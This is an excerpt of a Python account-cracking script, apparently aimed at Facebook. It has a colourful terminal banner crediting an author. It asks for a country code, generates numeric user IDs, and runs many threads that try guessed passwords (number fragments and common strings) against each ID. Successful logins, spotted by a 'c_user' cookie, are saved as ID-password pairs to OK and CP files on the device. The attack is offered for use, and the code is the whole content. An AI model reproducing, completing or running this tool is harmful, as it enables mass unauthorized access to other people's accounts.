...
logo =("""\033[0;92m
\33[;33m\n             ✨✨    : :  :: ::  :  :   : :  :   \33[;33m \n            ✨ ██████╗  █████╗ ██████╗ ███████╗\n            ✨ ██╔══██╗██╔══██╗██╔══██╗██╔════╝\n            ✨ ██║  ██║╚██████║██║  ██║█████╗  \n            ✨ ██║  ██║ ╚═══██║██║  ██║██╔══╝  \n            ✨ ██████╔╝ █████╔╝██████╔╝███████╗\n            ✨ ╚═════╝  ╚════╝ ╚═════╝ ╚══════╝\x1b[31m𝚟.1.1\33[;33m \n             ✨✨  :    :: ::  :: ::  ::   : :: ::\n \n \x1b[1;97m            ╔═════════════════════════════╗\n             ║ \033[1;36mTOOL NAME : Random      \x1b[1;97m    ║\n             ║ \033[1;34mAuthor    : Ahmeed ALIF   \x1b[1;97m  ║\n             ║ \033[1;35mGITHUB    : itzalif007   \x1b[1;97m   ║\n             ╚═════════════════════════════╝	   \n \n """) 
loop = 0
oks = []
cps = []
...
def xxr():
    ...
    code = input('\033[1;36m𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐔𝐍𝐓𝐑𝐘 𝐂𝐎𝐃𝐄 \033[1;37m: ')
    os.system('clear')
    print(logo)
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:],love,love[2:],code+love[:3],'bangladesh','@@@###','foysal11','405060','tebremon']
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
                pwx.append(love)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/x-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/x-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}D9DE{x}][%s\%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
